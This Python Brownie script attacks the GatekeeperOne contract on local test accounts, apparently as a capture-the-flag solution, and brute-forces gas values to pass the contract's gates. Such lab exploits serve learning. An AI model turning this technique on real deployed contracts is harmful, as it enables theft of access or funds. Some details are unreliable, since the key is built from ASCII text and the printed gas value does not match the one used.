from brownie import *
from .reports import *
from web3 import Web3
import binascii


a0 = accounts[0] # target deployer
a1 = accounts[1] # attacker account
BIGNUMBER = (10**18)

REPORT = Report()
REPORT.add_account(a0, 'Target deployer')
REPORT.add_account(a1, 'Attacker')

def main():
    target = prepare()
    attack(target)

def prepare():
    # deploy smart contract
    target = GatekeeperOne.deploy({'from': a0})

    # attacker should start with little ETH balance
    balance_to_burn = a1.balance() - 10*BIGNUMBER
    burn_address = accounts[3]
    a1.transfer(burn_address,balance_to_burn)

    REPORT.print()
    REPORT.txt_print('PRE-ATTACK STATE IS READY')
    return target

def attack(target):

    # deploy attacker
    attacker = Attacker.deploy(target,{'from':a1})

    # find key for gateThree
    txorigin = a1.address[-4:]
    key = b'0x100000000000'+txorigin.encode()
    print(key)
    
    # try many gas options to pass
    for gastry in range(8192):
        try:
            print(gastry)
            attacker.attack(key,900000+gastry,{'from':a1,'gas_limit':1000000})
            REPORT.txt_print('Found gasToPass: {}'.format(700000+gastry))
            break
        except:
            None
    
    if target.entrant() == a1.address:
        REPORT.txt_print('ATTACK SUCCESSFUL')
    else:
        REPORT.txt_print('ATTACK IS NOT SUCCESSFUL')
